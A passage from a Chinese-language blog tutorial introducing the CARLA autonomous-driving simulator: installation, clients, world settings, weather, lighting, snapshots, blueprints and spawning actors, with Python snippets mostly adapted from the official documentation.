点击进入官网，可以查看版本信息与官方文档。官方文档是我们学习的基础。下载模拟器时，应该进入官网查看最新版本，再前往carla的github主页进行下载，确保下载的是最新版本。因为<strong>只有最新版本的carla能通过pip命令安装依赖库，其他版本的安装非常繁琐（在下面第三大点有详细描述）。版本错误程序会直接崩溃。</strong><a href="https://github.com/carla-simulator/carla/releases">Releases · carla-simulator&#x2F;carla (github.com)</a> 根据版本下载对应的压缩包或使用git命令克隆下来。注意carla<strong>只支持Linux的乌班图系统和windows系统，不支持mac系统，</strong>mac用户使用虚拟机下载。</p><p><img src="/.io//image-20220713130421654.png" alt="image-20220713130421654"></p><p><img src="/.io//image-20220713130434214.png" alt="image-20220713130434214"></p><h3 id="1-3-仿真环境初体验"><a href="#1-3-仿真环境初体验" class="headerlink" title="1.3 仿真环境初体验"></a>1.3 仿真环境初体验</h3><p>解压下载好的压缩包，运行CarlaUE4.exe。windows可能会报“发布者未知”，这里点击信任，或直接关闭防火墙。carla的内核是虚幻4，需要较高的配置支持，首次启动请等待片刻。进去后是这样的画面：</p><p><img src="/.io//image-20220713131330156.png" alt="image-20220713131330156"></p><p>carla有好几个地图，还可以下载地图拓展，这里是默认的一号地图，后面可以在代码中修改。使用wasd键控制前后左右，按住鼠标中键可以转换视角，细看城市中的内容。后面可以在代码中修改地图。</p><p>使用conda命令窗口，激活car环境，使用cd命令转到WindowsNoEditor\PythonAPI\examples，使用python manual_control.py命令运行这个代码，可以得到一辆车，自由操控，使用Back键还能换别的来玩。</p><p>即使是这样，城市也非常空旷。接下来我们来看看如何使用carla进行自动驾驶的仿真。</p><h2 id="2-CARLA-Simulator的核心概念"><a href="#2-CARLA-Simulator的核心概念" class="headerlink" title="2. CARLA Simulator的核心概念"></a>2. CARLA Simulator的核心概念</h2><h3 id="2-1-客户端"><a href="#2-1-客户端" class="headerlink" title="2.1  客户端"></a>2.1  客户端</h3><h4 id="2-1-1客户端"><a href="#2-1-1客户端" class="headerlink" title="2.1.1客户端"></a>2.1.1客户端</h4><p>客户端是 CARLA 架构中的主要元素之一。 它们连接到服务器、检索信息和命令更改。 这是通过脚本完成的。 客户端识别自己，并连接到世界，然后使用模拟进行操作。</p><p>除此之外，客户还可以访问高级 CARLA 模块、功能和应用命令批处理。 本节仅介绍命令批处理。 这些对于生成大量actors之类的基本事物很有用。 其余功能更为复杂，将在各自页面的高级步骤中进行介绍。</p><p>查看 Python API 参考中的 carla.Client 以了解该类的特定方法和变量。</p><h4 id="2-1-2-客户端的创建"><a href="#2-1-2-客户端的创建" class="headerlink" title="2.1.2 客户端的创建"></a>2.1.2 客户端的创建</h4><p>使用carla.Client方法创建。需要三个参数，标识它的 IP 地址，以及用于与服务器通信的两个 TCP 端口。可选的第三个参数设置工作线程的数量。 默认情况下，这设置为全部 (0)。默认情况下，CARLA 使用本地主机 IP 和端口 2000 进行连接，但这些可以随意更改。 在这种情况下，第二个端口将始终为 n+1, 2001。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client = carla.Client(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2000</span>)</span><br></pre></td></tr></table></figure><h4 id="2-1-3-设置客户端超时时间"><a href="#2-1-3-设置客户端超时时间" class="headerlink" title="2.1.3 设置客户端超时时间"></a>2.1.3 设置客户端超时时间</h4><p>创建客户端后，使用set_timeout方法设置其超时时间。 这限制了所有网络操作，因此这些操作不会永远阻塞客户端。 如果连接失败，将返回错误。</p><p>可以连接多个客户端，因为一次运行多个脚本是很常见的。</p><p>超时时间以秒为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client.set_timeout(<span class="number">10.0</span>)</span><br></pre></td></tr></table></figure><h4 id="2-1-4-检查版本"><a href="#2-1-4-检查版本" class="headerlink" title="2.1.4 检查版本"></a>2.1.4 检查版本</h4><p>客户端和服务器具有不同的 libcarla 模块。 如果版本不同，可能会出现问题。 这可以使用 get_client_version() 和 get_server_version() 方法进行检查。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(client.get_client_version())</span><br><span class="line"><span class="built_in">print</span>(client.get_server_version())</span><br></pre></td></tr></table></figure><h4 id="2-1-5虚拟世界连接"><a href="#2-1-5虚拟世界连接" class="headerlink" title="2.1.5虚拟世界连接"></a>2.1.5虚拟世界连接</h4><p>客户端可以相当轻松地连接和检索当前世界。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">world = client.get_world()</span><br></pre></td></tr></table></figure><p>客户端还可以获取可用地图列表来更改当前地图。 这将摧毁当前的世界并创造一个新的世界。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(client.get_available_maps())</span><br><span class="line">...</span><br><span class="line">world = client.load_world(<span class="string">&#x27;Town01&#x27;</span>)</span><br><span class="line"><span class="comment"># client.reload_world() creates a new instance of the world with the same map. </span></span><br></pre></td></tr></table></figure><p>每个世界对象都有一个 ID 或形象地称作“情节”。 每次客户端调用 load_world() 或 reload_world() 时，前一个都会被销毁。 新的“情节”是从头开始创建的。 在此过程中不会重新启动虚幻引擎。</p><h4 id="2-1-6-运行命令"><a href="#2-1-6-运行命令" class="headerlink" title="2.1.6 运行命令"></a>2.1.6 运行命令</h4><p>命令是对一些最常见的 CARLA 方法的改编，可以批量应用。 例如，command.SetAutopilot 等价于 Vehicle.set_autopilot()，为车辆启用自动驾驶仪。 但是，使用 Client.apply_batch() 或 Client.apply_batch_sync() 方法，可以在一个模拟步骤中应用一系列命令。 这对于通常应用于甚至数百个元素的方法变得非常有用。</p><p>以下示例使用批处理一次性销毁车辆列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client.apply_batch([carla.command.DestroyActor(x) <span class="keyword">for</span> x <span class="keyword">in</span> vehicles_list])</span><br></pre></td></tr></table></figure><p>因此我们后面创建actors时，会开一个列表来存放方便销毁。</p><h4 id="2-1-7-其他客户端实用程序"><a href="#2-1-7-其他客户端实用程序" class="headerlink" title="2.1.7 其他客户端实用程序"></a>2.1.7 其他客户端实用程序</h4><p>客户端对象的主要目的是获取或改变世界，并应用命令。 但是，它还提供对一些附加功能的访问。</p><ul><li>交通管理模块：该模块负责每辆设置为自动驾驶的车辆，以重建城市交通。</li><li>录像模块：允许重新制定以前的模拟。 通过录像快照来总结每帧的模拟状态。</li></ul><p>后面会重新提及。</p><h3 id="2-2-虚拟世界"><a href="#2-2-虚拟世界" class="headerlink" title="2.2 虚拟世界"></a>2.2 虚拟世界</h3><h4 id="2-2-1-虚拟世界"><a href="#2-2-1-虚拟世界" class="headerlink" title="2.2.1 虚拟世界"></a>2.2.1 虚拟世界</h4><p>模拟测试的主要部分。 它的实例应该由客户端检索。 它不包含世界本身的模型，它是 Map 类的一部分。 相反，可以从此类访问大部分信息和常规设置。</p><ul><li>模拟中的参与者和旁观者</li><li>蓝图库</li><li>地图</li><li>模拟设置</li><li>快照</li><li>天气和灯光管理器</li></ul><p>它的一些最重要的方法是 getter，精确地检索这些元素的信息或实例。 查看 carla.World 以了解更多信息。、</p><p>carla.World PythonAPI reference：</p><ul><li><p>Instance Variables</p></li><li><ul><li>id (int)：与这个世界关联的 episode 的 id<ul><li>debug (carla.DebugHelper)：负责创建不同的 shapes for debugging</li></ul></li></ul></li><li><p>Methods</p></li><li><ul><li>apply_settings：将 carla.WorldSettings 对象包含的设置应用于仿真，并返回实现他们的帧 id<ul><li>cast_ray：将射线从指定的 initial_location 投射到 final_location，检测与射线相交的所有几何体，并按顺序返回到 carla.LabelledPoint 列表</li><li>enable_environment_objects：启用或禁用由 id 标识的一组 EnvironmentObject。这些对象将在关卡中显示或消失</li><li>freeze_all_traffic_lights：冻结或解冻场景中所有的交通信号灯</li><li>ground_projection：将指定的点向下 (0,0,-1) 投射到场景中，并返回 carla.Labelled 对象，这个对象是与射线相交的第一个几何体（通常是地面）</li><li>load_map_layer：将选定的图层加载到关卡</li><li>on_tick：此方法用于异步模式，从客户端启用传入的回调 callback</li><li>project_point：将指定的点投影到场景中的所需方向</li><li>remove_on_tick：停止从 on_tick 开始的 callback_id 的回调</li><li>reset_all_traffic_lights：将地图中所有交通信号灯的周期重置为初始状态</li><li>spawn_actor：在世界中创建 Actor</li><li>tick：此方法用于同步模式，发从 tick 给 server，返回服务器计算好的新 id</li><li>try_spawn_actor：与 spawn_actor，但失败使返回 None 而不是异常</li><li>unload_map_layer：将选定的图层卸载</li><li>wait_for_tick：此方法用于异步模式，使客户端等服务器 tick</li></ul></li></ul></li><li><p>Getters</p></li><li><ul><li>get_actor：通过 id 查找 Actor，如果没找到返回 None<ul><li>get_actors：检索 carla.Actor 列表，使用提供的 id 列表返回所有的 Actor</li><li>get_blueprint_library：返回可以在世界中创建的 Actor 列表</li><li>get_environment_objects：返回带有请求的语义的 EnvironmentObject 列表</li><li>get_level_bbs：返回在世界空间中具有位置和渲染的边界框数组</li><li>get_lightmanager：返回 carla.LightManager 的实例，该实例可用于处理场景中的灯光</li><li>get_map：像服务器查询包含地图文件的 XDOR，将其解析为 carla.Map 并返回</li><li>get_random_location_form_navigation：只能和行人一起使用。检索被用作目的地的随机位置 go_to_location 的 carla.WalkerAIController</li><li>get_settings：返回一个包含仿真数据的对象，例如客户端和服务器之间同步或渲染模式</li><li>get_snapshot：返回某个时刻的世界快照，包括有关参与者的所有信息</li><li>get_spectator：返回观察者。观察者用来作为相机，并控制仿真窗口中的视图</li><li>get_traffic_light：提供一个 landmark，返回他描述的交通灯对象</li><li>get_traffic_sign：提供一个 landmark，返回他描述的交通标志对象</li><li>get_vehicles_light_states：返回一个字典，他的 key 是 carla.Actor id，value 是 carla.VehicleLightState</li><li>get_weather：检索一个对象，该对象包含当前仿真的天气参数，主要是 云、雨、风和太阳的位置</li></ul></li></ul></li><li><p>Setters</p></li><li><ul><li>set_weather：设定天气</li></ul></li><li><p>Dunder methods</p></li><li><ul><li><code>__str__</code>：解析并打印世界内容，作为其当前状态的简要报告</li></ul></li></ul><h4 id="2-2-2-元素"><a href="#2-2-2-元素" class="headerlink" title="2.2.2 元素"></a>2.2.2 元素</h4><p>世界有不同的方法，这与允许不同功能的“参与者”相关。</p><ul><li>生成actors（但不破坏它们）</li><li>让每个元素都在现场，或者特别找一个</li><li>访问蓝图库</li><li>访问旁观者视角</li><li>检索适合生成元素的随机位置。</li></ul><p>actors就是“演员”，代表着世界里可以移动的物体，包括汽车，传感器（因为传感器要安在车身上）以及行人。</p><h4 id="2-2-3-天气"><a href="#2-2-3-天气" class="headerlink" title="2.2.3 天气"></a>2.2.3 天气</h4><p>天气本身不是一个类，而是一组可从世界访问的参数。 参数化包括太阳方向、云量、风、雾等等。 辅助类 carla.WeatherParameters 用于定义自定义天气。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">weather = carla.WeatherParameters(</span><br><span class="line">    cloudiness=<span class="number">80.0</span>,</span><br><span class="line">    precipitation=<span class="number">30.0</span>,</span><br><span class="line">    sun_altitude_angle=<span class="number">70.0</span>)</span><br><span class="line"></span><br><span class="line">world.set_weather(weather)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(world.get_weather())</span><br></pre></td></tr></table></figure><p>有一些天气预设可以直接应用于世界。 这些在 carla.WeatherParameters 中列出，并可作为枚举访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">world.set_weather(carla.WeatherParameters.WetCloudySunset)</span><br></pre></td></tr></table></figure><p>天气也可以使用 CARLA 提供的两个脚本进行自定义。</p><ul><li><strong><code>environment.py</code></strong> <em>(in <code>PythonAPI/util</code>)</em> — 提供对天气和灯光参数的访问，以便实时更改这些参数。</li></ul><p>environment.py中的可选参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-h, --help            show this help message and exit</span><br><span class="line">--host H              IP of the host server (default: 127.0.0.1)</span><br><span class="line">-p P, --port P        TCP port to listen to (default: 2000)</span><br><span class="line">--sun SUN             Sun position presets [sunset | day | night]</span><br><span class="line">--weather WEATHER     Weather condition presets [clear | overcast | rain]</span><br><span class="line">--altitude A, -alt A  Sun altitude [-90.0, 90.0]</span><br><span class="line">--azimuth A, -azm A   Sun azimuth [0.0, 360.0]</span><br><span class="line">--clouds C, -c C      Clouds amount [0.0, 100.0]</span><br><span class="line">--rain R, -r R        Rain amount [0.0, 100.0]</span><br><span class="line">--puddles Pd, -pd Pd  Puddles amount [0.0, 100.0]</span><br><span class="line">--wind W, -w W        Wind intensity [0.0, 100.0]</span><br><span class="line">--fog F, -f F         Fog intensity [0.0, 100.0]</span><br><span class="line">--fogdist Fd, -fd Fd  Fog Distance [0.0, inf)</span><br><span class="line">--wetness Wet, -wet Wet</span><br><span class="line">                      Wetness intensity [0.0, 100.0]</span><br></pre></td></tr></table></figure><ul><li><strong><code>dynamic_weather.py</code></strong> <em>(in <code>PythonAPI/examples</code>)</em> — 启用开发人员为每个 CARLA 地图准备的特定天气周期。</li></ul><p>dynamic_weather.py的可选参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-h, --help            show this help message and exit</span><br><span class="line">--host H              IP of the host server (default: 127.0.0.1)</span><br><span class="line">-p P, --port P        TCP port to listen to (default: 2000)</span><br><span class="line">-s FACTOR, --speed FACTOR</span><br><span class="line">                      rate at which the weather changes (default: 1.0)</span><br></pre></td></tr></table></figure><p><strong>天气的变化不会影响世界中的车辆的物理性质。 它们只是相机传感器可以捕捉到的视觉效果。当 sun_altitude_angle &lt; 0 时，夜间模式开始，这被认为是日落。 这是灯光变得特别重要的时候。世界中路灯会自动打开。</strong></p><h4 id="2-2-4-光线"><a href="#2-2-4-光线" class="headerlink" title="2.2.4 光线"></a>2.2.4 光线</h4><p>路灯有这些相关类：</p><ul><li>carla.Light：地图开发者放置的 lights，通过 carla.Light 对象访问</li><li>carla.LightState：颜色和强度等属性，在 light_state 中设置</li><li>carla.LightGroup：使用 light_group 进行分类，例如 路灯、建筑物灯…</li><li>carla.LightManager：可以在一个调用中被检索来处理一组灯光</li></ul><p>当模拟进入夜间模式时，路灯会自动打开。 灯光由地图的开发人员放置，并可作为 carla.Light 对象访问。 颜色和强度等属性可以随意更改。 carla.LightState 类型的变量 light_state 允许在一次调用中设置所有这些。<br>路灯使用 carla.LightGroup 类型的属性 light_group 进行分类。 这允许将灯分类为路灯、建筑灯…… carla.LightManager 的一个实例可以被检索以在一次调用中处理灯组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get the light manager and lights</span></span><br><span class="line">lmanager = world.get_lightmanager()</span><br><span class="line">mylights = lmanager.get_all_lights()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom a specific light</span></span><br><span class="line">light01 = mylights[<span class="number">0</span>]</span><br><span class="line">light01.turn_on()</span><br><span class="line">light01.set_intensity(<span class="number">100.0</span>)</span><br><span class="line">state01 = carla.LightState(<span class="number">200.0</span>,red,carla.LightGroup.Building,<span class="literal">True</span>)</span><br><span class="line">light01.set_light_state(state01)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom a group of lights</span></span><br><span class="line">my_lights = lmanager.get_light_group(carla.LightGroup.Building)</span><br><span class="line">lmanager.turn_on(my_lights)</span><br><span class="line">lmanager.set_color(my_lights,carla.Color(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">lmanager.set_intensities(my_lights,list_of_intensities)</span><br></pre></td></tr></table></figure><ul><li>车灯必须由用户打开&#x2F;关闭。 每辆车都有一组在 carla.VehicleLightState 中列出的灯。 到目前为止，并非所有车辆都集成了灯光。 以下是撰写本文时可用的列表。<br>  自行车：它们都有一个前后位置灯。<br>  摩托车： 雅马哈和哈雷戴维森车型。<br>  汽车：奥迪TT、雪佛兰、道奇（警车）、Etron、林肯、野马、特斯拉3S、大众T2以及来到CARLA的新模组。</li></ul><p>可以使用 carla.Vehicle.get_light_state 和 carla.Vehicle.set_light_state 方法随时检索和更新车辆的灯光。 这些使用二进制操作来自定义灯光设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Turn on position lights</span></span><br><span class="line">current_lights = carla.VehicleLightState.NONE</span><br><span class="line">current_lights |= carla.VehicleLightState.Position</span><br><span class="line">vehicle.set_light_state(current_lights)</span><br></pre></td></tr></table></figure><p>也可以使用天气部分中描述的 environment.py 实时设置灯光。</p><h4 id="2-2-5-调试"><a href="#2-2-5-调试" class="headerlink" title="2.2.5 调试"></a>2.2.5 调试</h4><p>世界对象有一个 carla.DebugHelper 对象作为公共属性。 它允许在模拟过程中绘制不同的形状。 这些用于跟踪正在发生的事件。 以下示例将在演员的位置和旋转处绘制一个红色框。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debug = world.debug</span><br><span class="line">debug.draw_box(carla.BoundingBox(actor_snapshot.get_transform().location,carla.Vector3D(<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">2</span>)),actor_snapshot.get_transform().rotation, <span class="number">0.05</span>, carla.Color(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>此示例在 carla.DebugHelper 中的一个片段中进行了扩展，该片段显示了如何为世界快照中的每个角色绘制框。</p><h4 id="2-2-6-快照"><a href="#2-2-6-快照" class="headerlink" title="2.2.6 快照"></a>2.2.6 快照</h4><p>包含模拟中每个角色在单个帧中的状态。 一种带有时间参考的世界静止图像。 信息来自相同的模拟步骤，即使在异步模式下也是如此。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Retrieve a snapshot of the world at current frame.</span></span><br><span class="line">world_snapshot = world.get_snapshot()</span><br></pre></td></tr></table></figure><p>carla.WorldSnapshot 包含 carla.Timestamp 和 carla.ActorSnapshot 列表。 可以使用演员的 ID 搜索演员快照。 快照列出了其中出现的演员的 ID。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">timestamp = world_snapshot.timestamp <span class="comment"># Get the time reference </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> actor_snapshot <span class="keyword">in</span> world_snapshot: <span class="comment"># Get the actor and the snapshot information</span></span><br><span class="line">    actual_actor = world.get_actor(actor_snapshot.<span class="built_in">id</span>)</span><br><span class="line">    actor_snapshot.get_transform()</span><br><span class="line">    actor_snapshot.get_velocity()</span><br><span class="line">    actor_snapshot.get_angular_velocity()</span><br><span class="line">    actor_snapshot.get_acceleration()  </span><br><span class="line"></span><br><span class="line">actor_snapshot = world_snapshot.find(actual_actor.<span class="built_in">id</span>) <span class="comment"># Get an actor&#x27;s snapshot</span></span><br></pre></td></tr></table></figure><h4 id="2-2-7-世界设置"><a href="#2-2-7-世界设置" class="headerlink" title="2.2.7 世界设置"></a>2.2.7 世界设置</h4><p>世界可以访问一些用于模拟的高级配置。 这些决定了渲染条件、模拟时间步长以及客户端和服务器之间的同步。 它们可以从助手类 carla.WorldSettings 中访问。</p><p>目前，默认的 CARLA 以最佳图形质量、可变时间步长和异步运行。 要进一步了解此问题，请查看“高级步骤”部分。 有关同步和时间步长以及渲染选项的页面可能是一个很好的起点。</p><h3 id="2-3-蓝图"><a href="#2-3-蓝图" class="headerlink" title="2.3 蓝图"></a>2.3 蓝图</h3><p>CARLA 中的 Actor 是在模拟中执行动作的元素，它们可以影响其他 Actor。 CARLA 中的参与者包括车辆和步行者，还包括传感器、交通标志、交通灯和观众。 对如何操作它们有充分的了解是至关重要的。</p><p>本节将介绍生成、销毁、类型以及如何管理它们。 </p><h4 id="2-3-1-蓝图"><a href="#2-3-1-蓝图" class="headerlink" title="2.3.1 蓝图"></a>2.3.1 蓝图</h4><p>这些布局允许用户将新演员顺利融入模拟。 它们是带有动画和一系列属性的已制作模型。 其中一些是可修改的，而另一些则不是。 这些属性包括车辆颜色、激光雷达传感器中的通道数量、步行者的速度等等。</p><p>可用的蓝图及其属性列在蓝图库中。 车辆和步行者蓝图有一个世代属性，指示它们是新的（第 2 代）还是旧的（第 1 代）资产。</p><h4 id="2-3-2管理蓝图库"><a href="#2-3-2管理蓝图库" class="headerlink" title="2.3.2管理蓝图库"></a>2.3.2管理蓝图库</h4><p>carla.BlueprintLibrary 类包含一个 carla.ActorBlueprint 元素列表。 世界对象可以提供对它的访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blueprint_library = world.get_blueprint_library()</span><br></pre></td></tr></table></figure><p>蓝图有一个 ID 来识别它们以及由此产生的演员。 可以读取该库以查找特定 ID、随机选择蓝图或使用通配符模式过滤结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find a specific blueprint.</span></span><br><span class="line">collision_sensor_bp = blueprint_library.find(<span class="string">&#x27;sensor.other.collision&#x27;</span>)</span><br><span class="line"><span class="comment"># Choose a vehicle blueprint at random.</span></span><br><span class="line">vehicle_bp = random.choice(blueprint_library.<span class="built_in">filter</span>(<span class="string">&#x27;vehicle.*.*&#x27;</span>))</span><br></pre></td></tr></table></figure><p>除此之外，每个 carla.ActorBlueprint 都有一系列 carla.ActorAttribute 可以获取和设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_bike = [vehicle.get_attribute(<span class="string">&#x27;number_of_wheels&#x27;</span>) == <span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span>(is_bike)</span><br><span class="line">    vehicle.set_attribute(<span class="string">&#x27;color&#x27;</span>, <span class="string">&#x27;255,0,0&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：有些属性无法修改，请在蓝图库中查看</strong></p><p>属性有一个 carla.ActorAttributeType 变量。 它从枚举列表中声明其类型。 此外，可修改属性带有推荐值列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> attr <span class="keyword">in</span> blueprint:</span><br><span class="line">    <span class="keyword">if</span> attr.is_modifiable:</span><br><span class="line">        blueprint.set_attribute(attr.<span class="built_in">id</span>, random.choice(attr.recommended_values))</span><br></pre></td></tr></table></figure><p>用户可以创建自己的交通工具。查看教程(资产)来学习。贡献者可以将他们的新内容添加到 CARLA。</p><h3 id="2-4-演员的生命周期"><a href="#2-4-演员的生命周期" class="headerlink" title="2.4 演员的生命周期"></a>2.4 演员的生命周期</h3><p>本节提到了关于参与者的不同方法。PythonAPI 提供了在一个框架中应用最常见的批处理命令的命令。</p><h4 id="2-4-1-生成"><a href="#2-4-1-生成" class="headerlink" title="2.4.1 生成"></a>2.4.1 生成</h4><p>世界对象负责生成actors并跟踪它们。 生成只需要一个蓝图和一个 carla.Transform 来说明 Actor 的位置和旋转。</p><p>这个世界有两种不同的方法来产生Actor。</p><ul><li>spawn_actor() 生成失败会报错</li><li>try_spawn_actor() 生成失败返回none</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">transform = Transform(Location(x=<span class="number">230</span>, y=<span class="number">195</span>, z=<span class="number">40</span>), Rotation(yaw=<span class="number">180</span>))</span><br><span class="line">actor = world.spawn_actor(blueprint, transform)</span><br></pre></td></tr></table></figure><p><strong>注意：CARLA 使用虚拟引擎坐标系统。记住 carla.Rotation()构造函数定义为(俯仰，偏航，滚动) ，它不同于一般的虚拟引擎编辑器(滚动，俯仰，偏航)。xyz坐标的单位是m</strong></p><p>这里的俯仰，偏航，滚动事实上是pitch, yaw, roll，在笛卡尔坐标系中，pitch是围绕X轴旋转，也叫做俯仰角，yaw是围绕Y轴旋转，也叫偏航角，roll是围绕Z轴旋转，也叫翻滚角。如下图所示</p><p><img src="/.io//20140401183456562.jpg" alt="20140401183456562"></p><p>如果在指定位置发生碰撞，actor 将不会生成。 无论这发生在静态对象还是其他Actor身上。 可以尝试避免这些不希望的生成碰撞。</p><ul><li>map.get_spawn_points() 用于车辆。 返回推荐的生成点列表。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn_points = world.get_map().get_spawn_points()</span><br></pre></td></tr></table></figure><ul><li>world.get_random_location() 用于行人。 返回人行道上的随机点。 同样的方法用于为步行者设置目标位置。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spawn_point = carla.Transform()</span><br><span class="line">spawn_point.location = world.get_random_location_from_navigation()</span><br></pre></td></tr></table></figure><p>一个actor在生成时可以附加到另一个actor上。 演员跟随他们所依附的父类。 这对传感器特别有用。 附件可以是刚性的（适合检索精确数据），也可以根据其父项轻松移动。附加类型由carla.AttachmentType 定义。</p><p><strong>注意：当产生附加到另一个actor上的actor时，提供的transformer必须相对于父actor。</strong></p><p>下一个示例将摄像头固定在车辆上，因此它们的相对位置保持固定。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Attach Actor</span></span><br><span class="line">camera_bp = blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(camera_bp)</span><br><span class="line">relative_transform = carla.Transform(carla.Location(<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>),carla.Rotation())</span><br><span class="line">camera = world.spawn_actor(camera_bp, relative_transform, actor, carla.AttachmentType.Rigid)</span><br></pre></td></tr></table></figure><p>生成后，世界对象会将演员添加到列表中。 这可以很容易地搜索或迭代。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">actor_list = world.get_actors()</span><br><span class="line"><span class="comment"># Find an actor by id.</span></span><br><span class="line">actor = actor_list.find(<span class="built_in">id</span>)</span><br><span class="line"><span class="comment"># Print the location of all the speed limit signs in the world.</span></span><br><span class="line"><span class="keyword">for</span> speed_sign <span class="keyword">in</span> actor_list.<span class="built_in">filter</span>(<span class="string">&#x27;traffic.speed_limit.*&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(speed_sign.get_location())</span><br></pre></td></tr></table></figure><p>上面的都是CARLA官方文档给我们写好的。实际上只有几个是常用的。如果我们想生成一个Actor, 必须要先定义它的蓝图（Blueprint），这就好比造房子前要先绘制设计图一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到这个世界所有物体的蓝图</span></span><br><span class="line">blueprint_library = world.get_blueprint_library()</span><br><span class="line"><span class="comment"># 从浩瀚如海的蓝图中找到奔驰的蓝图</span></span><br><span class="line">ego_vehicle_bp = blueprint_library.find(<span class="string">&#x27;vehicle.mercedes-benz.coupe&#x27;</span>)</span><br><span class="line"><span class="comment"># 给我们的车加上特定的颜色</span></span><br><span class="line">ego_vehicle_bp.set_attribute(<span class="string">&#x27;color&#x27;</span>, <span class="string">&#x27;0, 0, 0&#x27;</span>)</span><br><span class="line"><span class="comment"># 